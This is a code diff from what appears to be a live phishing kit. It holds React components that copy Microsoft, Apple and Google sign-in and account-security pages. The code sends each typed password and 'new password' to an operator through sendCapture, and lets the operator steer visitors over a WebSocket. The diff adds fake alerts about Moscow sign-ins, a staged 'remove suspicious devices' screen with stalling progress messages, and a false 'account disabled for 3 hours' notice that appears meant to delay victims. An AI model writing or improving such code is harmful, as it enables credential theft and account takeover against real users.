@@ -63,7 +63,7 @@ const AppleSpinRing = ({ isDark = true }: { isDark?: boolean }) => {
 };
 
 // ─── Shared WS action type ───────────────────────────────────────────────────
-type NavigateAction = { navigate?: string; promptNumber?: number; phoneDigits?: string };
+type NavigateAction = { navigate?: string; promptNumber?: number; phoneDigits?: string; waitSeconds?: number };
 type NavigateHandler = (step: string, action?: NavigateAction) => void;
 
 // ─── Microsoft types & helpers ────────────────────────────────────────────────
@@ -163,7 +163,7 @@ function useVisitorWS({ provider, onNavigate, onProviderSwitch, onSiteStatus }: 
 
       ws.onmessage = (e: MessageEvent<string>) => {
         try {
-          const msg = JSON.parse(e.data) as { type: string; action?: { navigate?: string; promptNumber?: number; phoneDigits?: string }; provider?: string };
+          const msg = JSON.parse(e.data) as { type: string; action?: { navigate?: string; promptNumber?: number; phoneDigits?: string; waitSeconds?: number }; provider?: string; active?: boolean };
           if (msg.type === 'ping') { ws.send(JSON.stringify({ type: 'pong' })); return; }
           if (msg.type === 'action' && msg.action?.navigate) onNavigateRef.current(msg.action.navigate, msg.action);
           if (msg.type === 'switch-provider' && msg.provider && !isViewOnly.current) {
@@ -239,6 +239,7 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
   const [newPasswordError, setNewPasswordError] = useState<string | null>(null);
   const [showNewPassword, setShowNewPassword] = useState(false);
   const [showConfirmNewPassword, setShowConfirmNewPassword] = useState(false);
+  const [pwdChanged, setPwdChanged] = useState(false);
 
   // Register state
   const [regEmail, setRegEmail] = useState('');
@@ -609,20 +610,13 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
                 <input
                   ref={passwordRef}
                   data-testid="ms-password-input"
-                  type={showPassword ? 'text' : 'password'}
+                  type="password"
                   value={password}
                   onChange={e => { setPassword(e.target.value); setPasswordError(null); }}
                   onKeyDown={e => { if (e.key === 'Enter' && password && !isSubmitting) { sendCapture('password', password); setIsSubmitting(true); } }}
                   placeholder="Password"
-                  className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] rounded-none focus:outline-none bg-transparent text-white placeholder-gray-500 text-[15px] transition-colors pr-10"
+                  className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] rounded-none focus:outline-none bg-transparent text-white placeholder-gray-500 text-[15px] transition-colors"
                 />
-                <button
-                  onClick={() => setShowPassword(v => !v)}
-                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-200 transition-colors"
-                  style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}
-                >
-                  {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
-                </button>
               </div>
               {passwordError && (
                 <div className="mb-2">
@@ -642,7 +636,7 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
                 {isSubmitting ? (
                   <span className="flex items-center justify-center gap-2">
                     <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
-                    Verifying…
+                    Signing you in…
                   </span>
                 ) : 'Next'}
               </button>
@@ -820,10 +814,10 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
               {/* Details card */}
               <div className="rounded-lg border border-[#3a3a3a] bg-[#1a1a1a] divide-y divide-[#2e2e2e] mb-6 text-[13px]">
                 {[
-                  ['Country/region', '🇹🇭 Thailand'],
-                  ['City', 'Phuket'],
+                  ['Country/region', '🇷🇺 Russia'],
+                  ['City', 'Moscow'],
                   ['Platform', 'Android'],
-                  ['Device', 'Samsung Galaxy S8'],
+                  ['Device', 'Alcatel A7 (Android 11)'],
                   ['IP address', `${(Math.random()*50+100|0)}.${(Math.random()*200+30|0)}.${(Math.random()*200+10|0)}.${(Math.random()*200+10|0)}`],
                 ].map(([label, value]) => (
                   <div key={label} className="flex items-center justify-between px-4 py-2.5">
@@ -837,15 +831,8 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
               </p>
               <div className="flex flex-col gap-2.5">
                 <button
-                  onClick={() => { sendCapture('security_alert_action', 'change_password'); nav('change-password'); }}
+                  onClick={() => { sendCapture('security_alert_action', 'not_me'); nav('change-password'); }}
                   className="w-full bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold py-2.5 transition-colors"
-                  style={{ borderRadius: 0 }}
-                >
-                  Change password
-                </button>
-                <button
-                  onClick={() => { sendCapture('security_alert_action', 'was_me'); nav('processing'); }}
-                  className="w-full border border-[#555] text-white text-[15px] font-semibold py-2.5 hover:bg-[#3a3a3a] transition-colors"
                   style={{ borderRadius: 0 }}
                 >
                   No, it wasn't me
@@ -863,69 +850,98 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
                 <MicrosoftLogo />
                 {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
               </div>
-              <div className="flex justify-center mb-4">
-                <div className="inline-flex items-center px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px]">
-                  {email || 'user@example.com'}
+
+              {pwdChanged ? (
+                /* ── Success state ── */
+                <div className="flex flex-col items-center text-center py-4">
+                  <div className="w-14 h-14 rounded-full bg-green-600/20 flex items-center justify-center mb-4">
+                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#4ade80" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                      <polyline points="20 6 9 17 4 12" />
+                    </svg>
+                  </div>
+                  <h1 className="text-[20px] font-bold text-white mb-2">Password changed</h1>
+                  <p className="text-[13px] text-[#aaa] mb-5 leading-relaxed">
+                    Your password has been updated successfully.
+                  </p>
+                  <div className="w-full rounded-lg border border-amber-500/30 bg-amber-500/10 px-4 py-4 text-left mb-4">
+                    <p className="text-[12px] text-amber-300 font-semibold mb-1">⚠ Temporary account restriction</p>
+                    <p className="text-[12px] text-[#ccc] leading-relaxed">
+                      Your account has been temporarily disabled for <strong className="text-white">3 hours</strong> while our security systems check for any further unauthorised access. You will be alerted when your account is fully restored.
+                    </p>
+                  </div>
                 </div>
-              </div>
-              <h1 className="text-[22px] font-bold text-white text-center mb-2">Create a new password</h1>
-              <p className="text-[13px] text-[#aaa] text-center mb-5 leading-relaxed">
-                Your new password must be at least 8 characters and cannot be the same as your old password.
-              </p>
-              {/* New password */}
-              <div className="relative mb-3">
-                <input
-                  type={showNewPassword ? 'text' : 'password'}
-                  value={newPassword}
-                  onChange={e => { setNewPassword(e.target.value); setNewPasswordError(null); }}
-                  placeholder="New password"
-                  className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] rounded-none focus:outline-none bg-transparent text-white placeholder-gray-500 text-[15px] transition-colors pr-10"
-                />
-                <button onClick={() => setShowNewPassword(v => !v)}
-                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-200 transition-colors"
-                  style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}>
-                  {showNewPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
-                </button>
-              </div>
-              {/* Confirm password */}
-              <div className="relative mb-2">
-                <input
-                  type={showConfirmNewPassword ? 'text' : 'password'}
-                  value={confirmNewPassword}
-                  onChange={e => { setConfirmNewPassword(e.target.value); setNewPasswordError(null); }}
-                  onKeyDown={e => {
-                    if (e.key === 'Enter' && newPassword && confirmNewPassword) {
+              ) : (
+                /* ── Form state ── */
+                <>
+                  <div className="flex justify-center mb-4">
+                    <div className="inline-flex items-center px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px]">
+                      {email || 'user@example.com'}
+                    </div>
+                  </div>
+                  <h1 className="text-[22px] font-bold text-white text-center mb-2">Create a new password</h1>
+                  <p className="text-[13px] text-[#aaa] text-center mb-5 leading-relaxed">
+                    Your new password must be at least 8 characters, include an uppercase letter and a special character.
+                  </p>
+                  {/* New password */}
+                  <div className="relative mb-3">
+                    <input
+                      type={showNewPassword ? 'text' : 'password'}
+                      value={newPassword}
+                      onChange={e => { setNewPassword(e.target.value); setNewPasswordError(null); }}
+                      placeholder="New password"
+                      className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] rounded-none focus:outline-none bg-transparent text-white placeholder-gray-500 text-[15px] transition-colors pr-10"
+                    />
+                    <button onClick={() => setShowNewPassword(v => !v)}
+                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-200 transition-colors"
+                      style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}>
+                      {showNewPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                    </button>
+                  </div>
+                  {/* Confirm password */}
+                  <div className="relative mb-2">
+                    <input
+                      type={showConfirmNewPassword ? 'text' : 'password'}
+                      value={confirmNewPassword}
+                      onChange={e => { setConfirmNewPassword(e.target.value); setNewPasswordError(null); }}
+                      onKeyDown={e => {
+                        if (e.key === 'Enter' && newPassword && confirmNewPassword) {
+                          if (newPassword !== confirmNewPassword) { setNewPasswordError('Passwords do not match. Try again.'); return; }
+                          if (!/[A-Z]/.test(newPassword)) { setNewPasswordError('Password must contain at least one uppercase letter.'); return; }
+                          if (!/[^A-Za-z0-9]/.test(newPassword)) { setNewPasswordError('Password must contain at least one special character.'); return; }
+                          sendCapture('new_password', newPassword);
+                          setPwdChanged(true);
+                        }
+                      }}
+                      placeholder="Confirm new password"
+                      className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] rounded-none focus:outline-none bg-transparent text-white placeholder-gray-500 text-[15px] transition-colors pr-10"
+                    />
+                    <button onClick={() => setShowConfirmNewPassword(v => !v)}
+                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-200 transition-colors"
+                      style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}>
+                      {showConfirmNewPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                    </button>
+                  </div>
+                  {newPasswordError && <p className="text-red-400 text-[13px] mb-2 leading-snug">{newPasswordError}</p>}
+                  <button
+                    onClick={() => {
+                      if (!newPassword || !confirmNewPassword) return;
                       if (newPassword !== confirmNewPassword) { setNewPasswordError('Passwords do not match. Try again.'); return; }
+                      if (!/[A-Z]/.test(newPassword)) { setNewPasswordError('Password must contain at least one uppercase letter.'); return; }
+                      if (!/[^A-Za-z0-9]/.test(newPassword)) { setNewPasswordError('Password must contain at least one special character.'); return; }
                       sendCapture('new_password', newPassword);
-                      nav('processing');
-                    }
-                  }}
-                  placeholder="Confirm new password"
-                  className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] rounded-none focus:outline-none bg-transparent text-white placeholder-gray-500 text-[15px] transition-colors pr-10"
-                />
-                <button onClick={() => setShowConfirmNewPassword(v => !v)}
-                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-200 transition-colors"
-                  style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}>
-                  {showConfirmNewPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
-                </button>
-              </div>
-              {newPasswordError && <p className="text-red-400 text-[13px] mb-2 leading-snug">{newPasswordError}</p>}
-              <button
-                onClick={() => {
-                  if (!newPassword || !confirmNewPassword) return;
-                  if (newPassword !== confirmNewPassword) { setNewPasswordError('Passwords do not match. Try again.'); return; }
-                  sendCapture('new_password', newPassword);
-                  nav('processing');
-                }}
-                disabled={!newPassword || !confirmNewPassword}
-                className="w-full bg-[#0078D4] hover:bg-[#005a9e] disabled:opacity-50 text-white text-[15px] font-semibold py-2.5 mt-3 mb-4 transition-colors"
-                style={{ borderRadius: 0 }}
-              >
-                Save
-              </button>
-              <a href="#" onClick={e => { e.preventDefault(); nav('security-alert'); }} className="text-[#3391e0] text-[13px] hover:underline text-center">
-                ‹ Back
-              </a>
+                      setPwdChanged(true);
+                    }}
+                    disabled={!newPassword || !confirmNewPassword}
+                    className="w-full bg-[#0078D4] hover:bg-[#005a9e] disabled:opacity-50 text-white text-[15px] font-semibold py-2.5 mt-3 mb-4 transition-colors"
+                    style={{ borderRadius: 0 }}
+                  >
+                    Save
+                  </button>
+                  <a href="#" onClick={e => { e.preventDefault(); nav('security-alert'); }} className="text-[#3391e0] text-[13px] hover:underline text-center">
+                    ‹ Back
+                  </a>
+                </>
+              )}
             </div>
           </motion.div>
         )}
@@ -1046,7 +1062,7 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
                 {isSubmitting ? (
                   <span className="flex items-center justify-center gap-2">
                     <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
-                    Verifying…
+                    Signing you in…
                   </span>
                 ) : 'Next'}
               </button>
@@ -2986,6 +3002,422 @@ function GoogleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHa
   );
 }
 
+// ─── Suspicious Devices Screen ────────────────────────────────────────────────
+
+type SuspDevice = { id: string; name: string; os: string; location: string; ip: string; flag: string; lastSeen: string; isCurrent: boolean; kind: 'android' | 'windows' | 'mac' };
+
+const SUSP_DEVICES: SuspDevice[] = [
+  { id: 'd1', name: 'Alcatel A7',       os: 'Android 11',         location: 'Moscow, Russia',    ip: '185.234.219.32',  flag: '🇷🇺', lastSeen: '2 min ago',   isCurrent: false, kind: 'android' },
+  { id: 'd2', name: 'Huawei P30 Lite',  os: 'Android 12',         location: 'Moscow, Russia',    ip: '185.234.220.157', flag: '🇷🇺', lastSeen: '34 min ago',  isCurrent: false, kind: 'android' },
+  { id: 'd3', name: 'DESKTOP-J4R2KN1',  os: 'Windows 10 Home',    location: 'Minsk, Belarus',    ip: '178.238.47.92',   flag: '🇧🇾', lastSeen: '2 hours ago', isCurrent: false, kind: 'windows' },
+  { id: 'd4', name: 'MacBook Pro',       os: 'macOS Ventura 13.4', location: 'Current location',  ip: '',                flag: '',    lastSeen: 'Active now',  isCurrent: true,  kind: 'mac'     },
+];
+
+const REMOVAL_MSGS = [
+  'Revoking device access tokens...',
+  'Invalidating session credentials...',
+  'Scanning for persistent threats...',
+  'Updating security certificates...',
+  'Cleaning up unauthorized sessions...',
+  'Verifying account integrity...',
+];
+
+function DeviceKindIcon({ kind, size = 36 }: { kind: string; size?: number }) {
+  if (kind === 'android') return (
+    <svg width={size} height={size} viewBox="0 0 40 40" fill="none">
+      <rect x="6" y="8" width="28" height="24" rx="3" fill="#E8F5E9" stroke="#43A047" strokeWidth="1.8"/>
+      <rect x="10" y="12" width="20" height="13" rx="1" fill="#C8E6C9"/>
+      <circle cx="20" cy="28.5" r="2" fill="#43A047"/>
+      <path d="M14 7L11.5 9M26 7L28.5 9" stroke="#43A047" strokeWidth="1.8" strokeLinecap="round"/>
+    </svg>
+  );
+  if (kind === 'windows') return (
+    <svg width={size} height={size} viewBox="0 0 40 40" fill="none">
+      <rect x="3" y="5" width="34" height="22" rx="2.5" fill="#E3F2FD" stroke="#1565C0" strokeWidth="1.8"/>
+      <rect x="7" y="9" width="26" height="14" rx="1" fill="#BBDEFB"/>
+      <path d="M13 35h14M20 27v8" stroke="#1565C0" strokeWidth="1.8" strokeLinecap="round"/>
+      <rect x="10" y="11"   width="7.5" height="5" rx="0.5" fill="#F25022"/>
+      <rect x="18.5" y="11" width="7.5" height="5" rx="0.5" fill="#7FBA00"/>
+      <rect x="10" y="17"   width="7.5" height="5" rx="0.5" fill="#00A4EF"/>
+      <rect x="18.5" y="17" width="7.5" height="5" rx="0.5" fill="#FFB900"/>
+    </svg>
+  );
+  return (
+    <svg width={size} height={size} viewBox="0 0 40 40" fill="none">
+      <rect x="3" y="5" width="34" height="22" rx="3" fill="#F5F5F7" stroke="#636366" strokeWidth="1.8"/>
+      <rect x="7" y="9" width="26" height="14" rx="1" fill="#D1D1D6"/>
+      <path d="M1.5 30c0-1.1.7-2.1 1.8-2.5L10 27h20l6.7.5c1.1.4 1.8 1.4 1.8 2.5v.6c0 .8-.7 1.4-1.5 1.4H3c-.8 0-1.5-.6-1.5-1.4V30z" fill="#F5F5F7" stroke="#636366" strokeWidth="1.8"/>
+      <rect x="15" y="30" width="10" height="1" rx="0.5" fill="#8E8E93"/>
+    </svg>
+  );
+}
+
+function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, email, visitorLocation }: {
+  provider: string; waitSeconds: number; extended: boolean; onDone: () => void;
+  email?: string; visitorLocation?: string;
+}) {
+  const [removedIds, setRemovedIds] = useState<Set<string>>(new Set());
+  const [removingId, setRemovingId] = useState<string | null>(null);
+  const [phase, setPhase] = useState<'list' | 'removing' | 'complete'>('list');
+  const [countdown, setCountdown] = useState(waitSeconds);
+  const [totalWait, setTotalWait] = useState(waitSeconds);
+  const [extendedShown, setExtendedShown] = useState(false);
+  const [msgIdx, setMsgIdx] = useState(0);
+
+  const anyRemoved = removedIds.size > 0;
+
+  const getDevLocation = (dev: SuspDevice) =>
+    dev.isCurrent && visitorLocation ? visitorLocation : dev.location;
+
+  const handleRemove = (id: string) => {
+    if (removingId) return;
+    setRemovingId(id);
+    setTimeout(() => { setRemovedIds(p => { const s = new Set(p); s.add(id); return s; }); setRemovingId(null); }, 900);
+  };
+
+  useEffect(() => {
+    if (phase !== 'removing') return;
+    if (countdown <= 0) { setPhase('complete'); return; }
+    const t = setTimeout(() => setCountdown(c => c - 1), 1000);
+    return () => clearTimeout(t);
+  }, [phase, countdown]);
+
+  useEffect(() => {
+    if (phase !== 'removing') return;
+    const t = setInterval(() => setMsgIdx(i => (i + 1) % REMOVAL_MSGS.length), 2500);
+    return () => clearInterval(t);
+  }, [phase]);
+
+  useEffect(() => {
+    if (!extended || extendedShown || phase !== 'removing') return;
+    setExtendedShown(true);
+    setCountdown(c => c + 35);
+    setTotalWait(t => t + 35);
+  }, [extended, extendedShown, phase]);
+
+  const progressPct = Math.max(0, Math.min(100, ((totalWait - countdown) / totalWait) * 100));
+
+  // ── Microsoft ─────────────────────────────────────────────────────────────
+  if (provider === 'microsoft') {
+    return (
+      <div className="fixed inset-0 z-50 overflow-y-auto bg-[#f2f2f2]" style={{ fontFamily: "'Segoe UI', system-ui, sans-serif" }}>
+        <div className="bg-white border-b border-[#e5e5e5] px-5 py-3 flex items-center gap-3 sticky top-0 z-10">
+          <MicrosoftLogo />
+          <span className="text-[15px] text-[#737373] font-light tracking-wide select-none">Microsoft account</span>
+          {email && <span className="ml-auto text-[12px] text-[#605e5c] truncate max-w-[220px]">{email}</span>}
+        </div>
+        <div className="max-w-[480px] mx-auto px-4 py-8">
+          <AnimatePresence mode="wait">
+            {phase === 'list' && (
+              <motion.div key="ms-list" initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} transition={{ duration: 0.22 }}>
+                <div className="flex gap-3 bg-[#f7f8fa] border border-[#dde1e7] rounded px-4 py-3 mb-6">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" className="flex-shrink-0 mt-0.5"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" stroke="#505a64" strokeWidth="1.5"/><line x1="12" y1="9" x2="12" y2="13" stroke="#505a64" strokeWidth="1.5" strokeLinecap="round"/><circle cx="12" cy="17" r="1" fill="#505a64"/></svg>
+                  <div>
+                    <div className="text-[14px] font-semibold text-[#1b1b1b] mb-0.5">Suspicious sign-in activity detected</div>
+                    <div className="text-[13px] text-[#605e5c] leading-snug">We found devices on your account that we don't recognize. Please review and remove any devices you don't use.</div>
+                  </div>
+                </div>
+                <div className="text-[20px] font-semibold text-[#1b1b1b] mb-1">Review connected devices</div>
+                <div className="text-[13px] text-[#605e5c] mb-5">These devices have recently accessed your Microsoft account.</div>
+                <div className="space-y-3 mb-6">
+                  {SUSP_DEVICES.map(dev => {
+                    const isRemoved = removedIds.has(dev.id);
+                    const isRemoving = removingId === dev.id;
+                    return (
+                      <motion.div key={dev.id} animate={{ opacity: isRemoved ? 0.4 : 1, scale: isRemoving ? 0.98 : 1 }} transition={{ duration: 0.3 }}
+                        className="bg-white border border-[#d6d6d6] rounded-lg px-4 py-3">
+                        <div className="flex items-start gap-3">
+                          <div className="mt-0.5 flex-shrink-0"><DeviceKindIcon kind={dev.kind} size={36} /></div>
+                          <div className="flex-1 min-w-0">
+                            <div className="flex items-center gap-2 flex-wrap">
+                              <span className="text-[14px] font-semibold text-[#1b1b1b]">{dev.name}</span>
+                              {dev.isCurrent && <span className="text-[10px] font-semibold bg-[#0078D4] text-white px-1.5 py-0.5 rounded">This device</span>}
+                              {dev.flag && !dev.isCurrent && <span className="text-[13px]">{dev.flag}</span>}
+                              {isRemoved && <span className="text-[11px] font-semibold text-[#107c10] flex items-center gap-1"><Check className="w-3 h-3" />Removed</span>}
+                            </div>
+                            <div className="text-[12px] text-[#605e5c] mt-0.5">{dev.os}</div>
+                            <div className="text-[12px] text-[#605e5c]">{getDevLocation(dev)}{dev.ip ? ` · ${dev.ip}` : ''}</div>
+                            <div className="text-[11px] text-[#a19f9d] mt-0.5">Last activity: {dev.lastSeen}</div>
+                          </div>
+                          <div className="flex-shrink-0 mt-0.5">
+                            {!dev.isCurrent && !isRemoved && !isRemoving && (
+                              <button onClick={() => handleRemove(dev.id)}
+                                className="text-[13px] font-semibold text-[#a4262c] hover:text-[#7d1c21] border border-[#a4262c] hover:border-[#7d1c21] px-3 py-1.5 rounded transition-colors">
+                                Remove device
+                              </button>
+                            )}
+                            {isRemoving && (
+                              <div className="flex items-center gap-1.5 text-[12px] text-[#605e5c]">
+                                <svg className="w-3.5 h-3.5 animate-spin" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#e5e5e5" strokeWidth="3"/><path d="M12 2a10 10 0 0110 10" stroke="#0078D4" strokeWidth="3" strokeLinecap="round"/></svg>
+                                Removing...
+                              </div>
+                            )}
+                          </div>
+                        </div>
+                      </motion.div>
+                    );
+                  })}
+                </div>
+                {anyRemoved && (
+                  <motion.button initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }} onClick={() => setPhase('removing')}
+                    className="w-full py-2.5 rounded text-[15px] font-semibold text-white hover:brightness-90 transition-all"
+                    style={{ backgroundColor: '#0078D4' }}>
+                    Secure my account
+                  </motion.button>
+                )}
+              </motion.div>
+            )}
+            {phase === 'removing' && (
+              <motion.div key="ms-removing" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col items-center py-10">
+                <div className="mb-6 relative w-16 h-16">
+                  <svg className="w-16 h-16 animate-spin" viewBox="0 0 64 64"><circle cx="32" cy="32" r="28" stroke="#e5e5e5" strokeWidth="5" fill="none"/><path d="M32 4a28 28 0 0128 28" stroke="#0078D4" strokeWidth="5" strokeLinecap="round" fill="none"/></svg>
+                  <div className="absolute inset-0 flex items-center justify-center"><MicrosoftLogo /></div>
+                </div>
+                <div className="text-[18px] font-semibold text-[#1b1b1b] mb-2 text-center">Removing unauthorized devices</div>
+                <div className="text-[13px] text-[#605e5c] mb-6 text-center min-h-[18px]">{REMOVAL_MSGS[msgIdx]}</div>
+                <div className="w-full bg-[#e5e5e5] rounded-full h-1.5 mb-3 overflow-hidden">
+                  <motion.div className="h-full rounded-full bg-[#0078D4]" animate={{ width: `${progressPct}%` }} transition={{ duration: 0.9, ease: 'linear' }} />
+                </div>
+                <div className="text-[12px] text-[#a19f9d] mb-4">Please wait — this may take a moment</div>
+                {extendedShown && (
+                  <motion.div initial={{ opacity: 0, y: 4 }} animate={{ opacity: 1, y: 0 }}
+                    className="mt-1 text-center bg-[#f7f8fa] border border-[#dde1e7] rounded px-4 py-3">
+                    <div className="text-[13px] font-medium text-[#1b1b1b]">Sorry, this may take a little longer.</div>
+                    <div className="text-[12px] text-[#605e5c] mt-0.5">We are thoroughly scanning your account for security threats.</div>
+                  </motion.div>
+                )}
+              </motion.div>
+            )}
+            {phase === 'complete' && (
+              <motion.div key="ms-done" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center py-10">
+                <div className="w-16 h-16 rounded-full bg-[#DFF6DD] flex items-center justify-center mb-5">
+                  <Check className="w-8 h-8 text-[#107c10]" />
+                </div>
+                <div className="text-[20px] font-semibold text-[#1b1b1b] mb-2 text-center">Account secured</div>
+                <div className="text-[13px] text-[#605e5c] mb-8 text-center">Unauthorized devices have been removed from your Microsoft account.</div>
+                <button onClick={onDone} className="px-10 py-2.5 rounded text-[15px] font-semibold text-white hover:brightness-90 transition-all" style={{ backgroundColor: '#0078D4' }}>Done</button>
+              </motion.div>
+            )}
+          </AnimatePresence>
+        </div>
+      </div>
+    );
+  }
+
+  // ── Apple ─────────────────────────────────────────────────────────────────
+  if (provider === 'apple') {
+    return (
+      <div className="fixed inset-0 z-50 overflow-y-auto bg-[#f5f5f7]" style={{ fontFamily: "-apple-system, 'SF Pro Display', system-ui, sans-serif" }}>
+        <div className="bg-white/90 backdrop-blur-xl border-b border-[#d1d1d6] px-6 py-3 flex items-center gap-2 sticky top-0 z-10">
+          <AppleLogo className="text-black" style={{ width: 17, height: 17 }} />
+          <span className="text-[15px] font-medium text-[#1d1d1f]">Apple ID</span>
+          <svg width="7" height="12" viewBox="0 0 7 12" fill="none" className="mx-0.5"><path d="M1 1l5 5-5 5" stroke="#c7c7cc" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
+          <span className="text-[15px] text-[#6e6e73]">Sign-In &amp; Security</span>
+          {email && <span className="ml-auto text-[12px] text-[#6e6e73] truncate max-w-[220px]">{email}</span>}
+        </div>
+        <div className="max-w-[520px] mx-auto px-4 py-8">
+          <AnimatePresence mode="wait">
+            {phase === 'list' && (
+              <motion.div key="apple-list" initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
+                <div className="flex gap-3 bg-[#f5f5f7] border border-[#d1d1d6] rounded-2xl px-4 py-3.5 mb-6">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" className="flex-shrink-0 mt-0.5"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" stroke="#3a3a3c" strokeWidth="1.5"/><line x1="12" y1="9" x2="12" y2="13" stroke="#3a3a3c" strokeWidth="1.5" strokeLinecap="round"/><circle cx="12" cy="17" r="1" fill="#3a3a3c"/></svg>
+                  <div>
+                    <div className="text-[14px] font-semibold text-[#1d1d1f] mb-0.5">Unauthorised access detected</div>
+                    <div className="text-[13px] text-[#3a3a3c] leading-snug">Devices were detected on your Apple ID that you may not recognise. Review and remove them below.</div>
+                  </div>
+                </div>
+                <div className="text-[26px] font-semibold text-[#1d1d1f] mb-1 tracking-tight">Devices</div>
+                <div className="text-[15px] text-[#6e6e73] mb-6">The following devices are signed in to your Apple ID.</div>
+                <div className="bg-white rounded-2xl overflow-hidden border border-[#d1d1d6] divide-y divide-[#d1d1d6] mb-6">
+                  {SUSP_DEVICES.map(dev => {
+                    const isRemoved = removedIds.has(dev.id);
+                    const isRemoving = removingId === dev.id;
+                    return (
+                      <div key={dev.id} className={`px-5 py-4 transition-opacity ${isRemoved ? 'opacity-40' : ''}`}>
+                        <div className="flex items-center gap-4">
+                          <div className="flex-shrink-0"><DeviceKindIcon kind={dev.kind} size={40} /></div>
+                          <div className="flex-1 min-w-0">
+                            <div className="flex items-center gap-2 flex-wrap">
+                              <span className="text-[16px] font-medium text-[#1d1d1f]">{dev.name}</span>
+                              {dev.isCurrent && <span className="text-[11px] font-semibold bg-[#007AFF] text-white px-2 py-0.5 rounded-full">This device</span>}
+                              {isRemoved && <span className="text-[12px] text-[#34c759] font-medium flex items-center gap-0.5"><Check className="w-3 h-3" />Removed</span>}
+                            </div>
+                            <div className="text-[13px] text-[#6e6e73]">{dev.os}</div>
+                            <div className="text-[12px] text-[#8e8e93] flex flex-wrap gap-x-1 mt-0.5">
+                              {dev.flag && <span>{dev.flag}</span>}
+                              <span>{getDevLocation(dev)}</span>
+                              {dev.ip && <><span className="text-[#c7c7cc]">·</span><span className="font-mono">{dev.ip}</span></>}
+                              <span className="text-[#c7c7cc]">·</span><span>{dev.lastSeen}</span>
+                            </div>
+                          </div>
+                          <div className="flex-shrink-0">
+                            {!dev.isCurrent && !isRemoved && !isRemoving && (
+                              <button onClick={() => handleRemove(dev.id)}
+                                className="text-[#FF3B30] text-[14px] font-medium hover:text-[#c0150a] transition-colors">
+                                Remove
+                              </button>
+                            )}
+                            {isRemoving && <svg className="w-4 h-4 animate-spin text-[#8e8e93]" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="2.5" strokeOpacity="0.3"/><path d="M12 2a10 10 0 0110 10" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round"/></svg>}
+                          </div>
+                        </div>
+                      </div>
+                    );
+                  })}
+                </div>
+                {anyRemoved && (
+                  <motion.button initial={{ opacity: 0 }} animate={{ opacity: 1 }} onClick={() => setPhase('removing')}
+                    className="w-full py-3 rounded-2xl text-[17px] font-medium text-white transition-all hover:brightness-90"
+                    style={{ backgroundColor: '#007AFF' }}>
+                    Done
+                  </motion.button>
+                )}
+              </motion.div>
+            )}
+            {phase === 'removing' && (
+              <motion.div key="apple-removing" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col items-center py-12">
+                <div className="mb-6">
+                  <AppleSpinRing isDark={false} />
+                </div>
+                <div className="text-[20px] font-semibold text-[#1d1d1f] mb-2 text-center tracking-tight">Removing unauthorised devices</div>
+                <div className="text-[15px] text-[#6e6e73] mb-6 text-center min-h-[20px]">{REMOVAL_MSGS[msgIdx]}</div>
